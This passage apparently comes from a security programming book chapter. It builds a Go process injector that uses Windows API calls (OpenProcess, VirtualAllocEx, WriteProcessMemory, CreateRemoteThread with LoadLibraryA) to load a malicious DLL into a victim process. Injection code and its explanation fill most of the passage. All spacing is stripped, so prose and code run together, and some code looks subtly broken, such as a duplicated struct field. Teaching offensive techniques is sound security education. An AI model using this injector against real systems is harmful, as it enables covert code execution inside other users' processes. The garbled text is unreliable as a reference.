andNewLazySystemDLL().)
BeforewecaninteractwiththeDLL,wemustestablisha
variablethatwecanuseinourcode.Wedothisbycalling
module.NewProcforeachAPIthatwe’llneedtouse.At❷,we
callitagainstOpenProcess()andassignittoanexportedvariable
calledProcOpenProcess.TheuseofOpenProcess()isarbitrary;it’s
intendedtodemonstratethetechniqueforassigningany
exportedWindowsDLLfunctiontoadescriptivevariable
name.
ObtainingaProcessTokenwiththeOpenProcess
WindowsAPI
Next,webuildouttheOpenProcessHandle()function,whichwe’ll
usetoobtainaprocesshandletoken.Wewilllikelyusethe
termstokenandhandleinterchangeablythroughoutthecode,
butrealizethateveryprocesswithinaWindowssystemhasa
uniqueprocesstoken.Thisprovidesameanstoenforce
relevantsecuritymodels,suchasMandatoryIntegrityControl,
acomplexsecuritymodel(andonethatisworthinvestigating
inordertogetmoreacquaintedwithprocess-levelmechanics).
Thesecuritymodelsconsistofsuchitemsasprocess-level
rightsandprivileges,forexample,anddictatehowboth
unprivilegedandelevatedprocessescaninteractwithone
another.
First,let’stakealookattheC++OpenProcess()datastructure
asdefinedwithintheWindowAPIdocumentation(Listing12-
4).We’lldefinethisobjectasifweintendedtocallitfrom
nativeWindowsC++code.However,wewon’tbedoingthis,
becausewe’llbedefiningthisobjecttobeusedwithGo’s
syscallpackage.Therefore,we’llneedtotranslatethisobjectto
standardGodatatypes.
HANDLEOpenProcess(
DWORD❶dwDesiredAccess,
BOOLbInheritHandle,
DWORDdwProcessId
);
Listing12-4:AnarbitraryWindowsC++objectanddatatypes
ThefirstnecessarytaskistotranslateDWORD❶toausable
typethatGomaintains.ADWORDisdefinedbyMicrosoftasa
32-bitunsignedinteger,whichcorrespondstoGo’suint32type.
TheDWORDvaluestatesthatitmustcontaindwDesiredAccessor,
asthedocumentationstates,“oneormoreoftheprocess
accessrights.”Processaccessrightsdefinetheactionswe
wishtotakeuponaprocess,givenavalidprocesstoken.
Wewanttodeclareavarietyofprocessaccessrights.Since
thesevalueswon’tchange,weplacesuchrelevantvaluesina
Goconstantsfile,asshowninListing12-5.Eachlineinthis
listdefinesaprocessaccessright.Thelistcontainsalmost
everyavailableprocessaccessright,butwewilluseonlythe
onesnecessaryforobtainingaprocesshandle.
const(
//
docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights
PROCESS_CREATE_PROCESS=0x0080
PROCESS_CREATE_THREAD=0x0002
PROCESS_DUP_HANDLE=0x0040
PROCESS_QUERY_INFORMATION=0x0400
PROCESS_QUERY_LIMITED_INFORMATION=0x1000
PROCESS_SET_INFORMATION=0x0200
PROCESS_SET_QUOTA=0x0100
PROCESS_SUSPEND_RESUME=0x0800
PROCESS_TERMINATE=0x0001
PROCESS_VM_OPERATION=0x0008
PROCESS_VM_READ=0x0010
PROCESS_VM_WRITE=0x0020
PROCESS_ALL_ACCESS=0x001F0FFF
)
Listing12-5:Aconstantssectiondeclaringprocessaccessrights(/ch-
12/procInjector/winsys/constants.go)
AlltheprocessaccessrightswedefinedinListing12-5
reconcilewiththeirrespectiveconstanthexadecimalvalues,
whichistheformattheyneedtobeintoassignthemtoaGo
variable.
Oneissuethatwe’dliketodescribepriortoreviewing
Listing12-6isthatmostofthefollowingprocessinjection
functions,notjustOpenProcessHandle(),willconsumeacustom
objectoftypeInjectandreturnavalueoftypeerror.TheInject
structobject(Listing12-6)willcontainvariousvaluesthat
willbeprovidedtotherelevantWindowsfunctionviasyscall.
typeInjectstruct{
Piduint32
DllPathstring
DLLSizeuint32
Privilegestring
RemoteProcHandleuintptr
Lpaddruintptr
LoadLibAddruintptr
RThreaduintptr
TokenTOKEN
TokenTOKEN
}
typeTOKENstruct{
tokenHandlesyscall.Token
}
Listing12-6:TheInjectstructusedtoholdcertainprocessinjectiondatatypes(/ch-
12/procInjector/winsys/models.go)
Listing12-7illustratesourfirstactualfunction,
OpenProcessHandle().Let’stakealookatthefollowingcodeblock
anddiscussthevariousdetails.
funcOpenProcessHandle(i*Inject)error{
❶varrightsuint32=PROCESS_CREATE_THREAD|
PROCESS_QUERY_INFORMATION|
PROCESS_VM_OPERATION|
PROCESS_VM_WRITE|
PROCESS_VM_READ
❷varinheritHandleuint32=0
❸varprocessIDuint32=i.Pid
❹remoteProcHandle,_,lastErr❺:=ProcOpenProcess.Call❻(
uintptr(rights),//DWORDdwDesiredAccess
uintptr(inheritHandle),//BOOLbInheritHandle
uintptr(processID))//DWORDdwProcessId
ifremoteProcHandle==0{
returnerrors.Wrap(lastErr,`[!]ERROR:
Can'tOpenRemoteProcess.Mayberunningwelevatedintegrity?`)
}
i.RemoteProcHandle=remoteProcHandle
fmt.Printf("[-]InputPID:%v\n",i.Pid)
fmt.Printf("[-]InputDLL:%v\n",i.DllPath)
fmt.Printf("[+]Processhandle:%v\n",unsafe.Pointer(i.RemoteProcHandle))
returnnil
}
Listing12-7:TheOpenProcessHandle()functionusedtoobtainaprocesshandle(/ch-
12/procInjector/winsys/inject.go)
Thecodestartsbyassigningprocessaccessrightstothe
uint32variablecalledrights❶.Theactualvaluesassigned
includePROCESS_CREATE_THREAD,whichallowsustocreatea
threadonourremoteprocess.Followingthatis
PROCESS_QUERY_INFORMAITON,whichgivesustheabilityto
genericallyquerydetailsabouttheremoteprocess.Thelast
threeprocessaccessrights,PROCESS_VM_OPERATION,
PROCESS_VM_WRITE,andPROCESS_VM_READ,allprovidethe
accessrightstomanagetheremoteprocessvirtualmemory.
Thenextdeclaredvariable,inheritHandle❷,dictateswhether
ournewprocesshandlewillinherittheexistinghandle.We
passin0toindicateaBooleanfalsevalue,aswewantanew
processhandle.ImmediatelyfollowingistheprocessID❸
variablecontainingthePIDofthevictimprocess.Allthe
while,wereconcileourvariabletypeswiththeWindowsAPI
documentation,suchthatbothourdeclaredvariablesareof
typeuint32.Thispatterncontinuesuntilwemakethesystem
callbyusingProcOpenProcess.Call()❻.
The.Call()methodconsumesavaryingnumberofuintptr
values,which,ifweweretolookattheCall()function
signature,wouldbedeclaredliterallyas...uintptr.Additionally,
thereturntypesaredesignatedasuintptr❹anderror❺.Further,
theerrortypeisnamedlastErr❺,whichyou’llfindreferenced
intheWindowsAPIdocumentation,andcontainsthereturned
errorvalueasdefinedbytheactualcalledfunction.
ManipulatingMemorywiththeVirtualAllocEx
WindowsAPI
Nowthatwehavearemoteprocesshandle,weneedameans
toallocatevirtualmemorywithintheremoteprocess.Thisis
necessaryinordertosetasidearegionofmemoryand
initializeitpriortowritingtoit.Let’sbuildthatoutnow.
PlacethefunctiondefinedinListing12-8immediatelyafter
thefunctiondefinedinListing12-7.(Wewillcontinueto
appendfunctions,oneafteranother,aswenavigatetheprocess
injectioncode.)
funcVirtualAllocEx(i*Inject)error{
varflAllocationTypeuint32=MEM_COMMIT|MEM_RESERVE
varflProtectuint32=PAGE_EXECUTE_READWRITE
lpBaseAddress,_,lastErr:=ProcVirtualAllocEx.Call(
i.RemoteProcHandle,//HANDLEhProcess
uintptr(nullRef),//LPVOIDlpAddress❶
uintptr(i.DLLSize),//SIZE_TdwSize
uintptr(flAllocationType),//DWORDflAllocationType
//
https://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants
uintptr(flProtect))//DWORDflProtect
iflpBaseAddress==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Can'tAllocateMemoryOnRemote
Process.")
}
i.Lpaddr=lpBaseAddress
fmt.Printf("[+]Basememoryaddress:%v\n",unsafe.Pointer(i.Lpaddr))
returnnil
}
Listing12-8:AllocatingaregionofmemoryintheremoteprocessviaVirtualAllocEx
(/ch-12/procInjector/winsys/inject.go)
UnlikethepreviousOpenProcess()systemcall,weintroducea
newdetailviathenullRefvariable❶.Thenilkeywordis
reservedbyGoforallnullintents.However,it’satypedvalue,
whichmeansthatpassingitdirectlyviaasyscallwithoutatype
willresultineitheraruntimeerrororatype-conversionerror
—eitherway,abadsituation.Thefixissimpleinthiscase:we
declareavariablethatresolvestoa0value,suchasaninteger.
The0valuecannowbereliablypassedandinterpretedasanull
valuebythereceivingWindowsfunction.
WritingtoMemorywiththeWriteProcessMemory
WindowsAPI
Next,we’llusetheWriteProcessMemory()functiontowritetothe
remoteprocess’smemoryregionpreviouslyinitializedusing
theVirtualAllocEx()function.InListing12-9,we’llkeepthings
simplebycallingaDLLbyfilepath,ratherthanwritingthe
entireDLLcodeintomemory.
funcWriteProcessMemory(i*Inject)error{
varnBytesWritten*byte
dllPathBytes,err:=syscall.BytePtrFromString(i.DllPath)❶
iferr!=nil{
returnerr
}
writeMem,_,lastErr:=ProcWriteProcessMemory.Call(
i.RemoteProcHandle,//HANDLEhProcess
i.Lpaddr,//LPVOIDlpBaseAddress
uintptr(unsafe.Pointer(dllPathBytes)),//LPCVOIDlpBuffer❷
uintptr(i.DLLSize),//SIZE_TnSize
uintptr(unsafe.Pointer(nBytesWritten)))//SIZE_T
*lpNumberOfBytesWritten
ifwriteMem==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Can'twritetoprocessmemory.")
}
returnnil
}
Listing12-9:WritingtheDLLfilepathtoremoteprocessmemory(/ch-
12/procInjector/winsys/inject.go)
ThefirstnoticeablesyscallfunctionisBytePtrFromString()❶,
whichisaconveniencefunctionthatconsumesastringand
returnsthebaseindex-0pointerlocationofabyteslice,which
we’llassigntodllPathBytes.
Finally,wegettoseeunsafe.Pointerinaction.Thethird
argumenttotheProcWriteProcessMemory.Callisdefinedwithinthe
WindowsAPIspecificationas“lpBuffer—apointertothebuffer
thatcontainsdatatobewrittenintheaddressspaceofthe
specifiedprocess.”InordertopasstheGopointervalue
definedindllPathBytesovertothereceivingWindowsfunction,
weuseunsafe.Pointertocircumventtypeconversions.Onefinal
pointtomakehereisthatuintptrandunsafe.Pointer❷are
acceptablysafe,sincebotharebeingusedinlineandwithout
theintentofassigningthereturnvaluetoavariableforlater
reuse.
FindingLoadLibraryAwiththeGetProcessAddress
WindowsAPI
Kernel32.dllexportsafunctioncalledLoadLibraryA(),whichis
availableonallWindowsversions.Microsoftdocumentation
statesthatLoadLibraryA()“loadsthespecifiedmoduleintothe
addressspaceofthecallingprocess.Thespecifiedmodule
maycauseothermodulestobeloaded.”Weneedtoobtainthe
memorylocationofLoadLibraryA()beforecreatingaremote
threadnecessarytoexecuteouractualprocessinjection.We
candothiswiththeGetLoadLibAddress()function—oneofthose
supportingfunctionsmentionedearlier(Listing12-10).
funcGetLoadLibAddress(i*Inject)error{
varllibBytePtr*byte
llibBytePtr,err:=syscall.BytePtrFromString("LoadLibraryA")❶
iferr!=nil{
returnerr
}
lladdr,_,lastErr:=ProcGetProcAddress.Call❷(
ModKernel32.Handle(),//HMODULEhModule❸
uintptr(unsafe.Pointer(llibBytePtr)))//LPCSTRlpProcName❹
if&lladdr==nil{
returnerrors.Wrap(lastErr,"[!]ERROR:Can'tgetprocessaddress.")
}
i.LoadLibAddr=lladdr
fmt.Printf("[+]Kernel32.Dllmemoryaddress:%v\n",
unsafe.Pointer(ModKernel32.Handle()))
fmt.Printf("[+]Loadermemoryaddress:%v\n",unsafe.Pointer(i.LoadLibAddr))
returnnil
}
Listing12-10:ObtainingtheLoadLibraryA()memoryaddressbyusingthe
GetProcessAddress()Windowsfunction(/ch-12/procInjector/winsys/inject.go)
WeusetheGetProcessAddress()Windowsfunctiontoidentify
thebasememoryaddressofLoadLibraryA()necessarytocallthe
CreateRemoteThread()function.TheProcGetProcAddress.Call()❷
functiontakestwoarguments:thefirstisahandletoKernel32.dll
❸thatcontainstheexportedfunctionwe’reinterestedin
(LoadLibraryA()),andthesecondisthebaseindex-0pointer
location❹ofabyteslicereturnedfromtheliteralstring
"LoadLibraryA"❶.
ExecutingtheMaliciousDLLUsingthe
CreateRemoteThreadWindowsAPI
We’llusetheCreateRemoteThread()Windowsfunctiontocreatea
threadagainsttheremoteprocess’virtualmemoryregion.If
thatregionhappenstobeLoadLibraryA(),wenowhaveameans
toloadandexecutetheregionofmemorycontainingthefile
pathtoourmaliciousDLL.Let’sreviewthecodeinListing
12-11.
funcCreateRemoteThread(i*Inject)error{
varthreadIduint32=0
vardwCreationFlagsuint32=0
remoteThread,_,lastErr:=ProcCreateRemoteThread.Call❶(
i.RemoteProcHandle,//HANDLEhProcess❷
uintptr(nullRef),//LPSECURITY_ATTRIBUTESlpThreadAttributes
uintptr(nullRef),//SIZE_TdwStackSize
i.LoadLibAddr,//LPTHREAD_START_ROUTINElpStartAddress❸
i.Lpaddr,//LPVOIDlpParameter❹
uintptr(dwCreationFlags),//DWORDdwCreationFlags
uintptr(unsafe.Pointer(&threadId)),//LPDWORDlpThreadId
)
ifremoteThread==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Can'tCreateRemoteThread.")
}
i.RThread=remoteThread
fmt.Printf("[+]Threadidentifiercreated:%v\n",unsafe.Pointer(&threadId))
fmt.Printf("[+]Threadhandlecreated:%v\n",unsafe.Pointer(i.RThread))
returnnil
}
Listing12-11:ExecutingtheprocessinjectionbyusingtheCreateRemoteThread()
Windowsfunction(/ch-12/procInjector/winsys/inject.go)
TheProcCreateRemoteThread.Call()❶functiontakesatotalof
sevenarguments,althoughwe’lluseonlythreeoftheminthis
example.TherelevantargumentsareRemoteProcHandle❷
containingthevictimprocess’shandle,LoadLibAddr❸
containingthestartroutinetobecalledbythethread(inthis
case,LoadLibraryA()),and,lastly,thepointer❹tothevirtually
allocatedmemoryholdingthepayloadlocation.
VerifyingInjectionwiththeWaitforSingleObject
WindowsAPI
We’llusetheWaitforSingleObject()Windowsfunctiontoidentify
whenaparticularobjectisinasignaledstate.Thisisrelevant
toprocessinjectionbecausewewanttowaitforourthreadto
executeinordertoavoidbailingoutprematurely.Let’sbriefly
discussthefunctiondefinitioninListing12-12.
funcWaitForSingleObject(i*Inject)error{
vardwMillisecondsuint32=INFINITE
vardwExitCodeuint32
rWaitValue,_,lastErr:=ProcWaitForSingleObject.Call(❶
i.RThread,//HANDLEhHandle
uintptr(dwMilliseconds))//DWORDdwMilliseconds
ifrWaitValue!=0{
returnerrors.Wrap(lastErr,"[!]ERROR:Errorreturningthreadwaitstate.")
}
success,_,lastErr:=ProcGetExitCodeThread.Call(❷
i.RThread,//HANDLEhThread
uintptr(unsafe.Pointer(&dwExitCode)))//LPDWORDlpExitCode
ifsuccess==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Errorreturningthreadexitcode.")
}
closed,_,lastErr:=ProcCloseHandle.Call(i.RThread)//HANDLEhObject❸
ifclosed==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Errorclosingthreadhandle.")
}
returnnil
}
Listing12-12:UsingtheWaitforSingleObject()Windowsfunctiontoensuresuccessful
threadexecution(/ch-12/procInjector/winsys/inject.go)
Threenotableeventsareoccurringinthiscodeblock.First,
theProcWaitForSingleObject.Call()systemcall❶ispassedthethread
handlereturnedinListing12-11.AwaitvalueofINFINITEis
passedasthesecondargumenttodeclareaninfiniteexpiration
timeassociatedwiththeevent.
Next,ProcGetExitCodeThread.Call()❷determineswhetherthe
threadterminatedsuccessfully.Ifitdid,theLoadLibraryA
functionshouldhavebeencalled,andourDLLwillhavebeen
executed.Finally,aswedofortheresponsiblecleanupof
almostanyhandle,wepassedtheProcCloseHandle.Call()system
call❸sothatthatthreadobjecthandleclosescleanly.
CleaningUpwiththeVirtualFreeExWindowsAPI
WeusetheVirtualFreeEx()Windowsfunctiontorelease,or
decommit,thevirtualmemorythatweallocatedinListing12-
8viaVirtualAllocEx().Thisisnecessarytocleanupmemory
responsibly,sinceinitializedmemoryregionscanberather
large,consideringtheoverallsizeofthecodebeinginjected
intotheremoteprocess,suchasanentireDLL.Let’stakea
lookatthisblockofcode(Listing12-13).
funcVirtualFreeEx(i*Inject)error{
vardwFreeTypeuint32=MEM_RELEASE
varsizeuint32=0//Sizemustbe0toMEM_RELEASEalloftheregion
rFreeValue,_,lastErr:=ProcVirtualFreeEx.Call❶(
i.RemoteProcHandle,//HANDLEhProcess❷
i.Lpaddr,//LPVOIDlpAddress❸
uintptr(size),//SIZE_TdwSize❹
uintptr(dwFreeType))//DWORDdwFreeType❺
ifrFreeValue==0{
returnerrors.Wrap(lastErr,"[!]ERROR:Errorfreeingprocessmemory.")
}
fmt.Println("[+]Success:Freedmemoryregion")
returnnil
}
Listing12-13:FreeingvirtualmemorybyusingtheVirtualFreeEx()Windowsfunction
(/ch-12/procInjector/winsys/inject.go)
TheProcVirtualFreeEx.Call()function❶takesfourarguments.
Thefirstistheremoteprocesshandle❷associatedwiththe
processthatistohaveitsmemoryfreed.Thenextargumentis
apointer❸tothelocationofmemorytobefreed.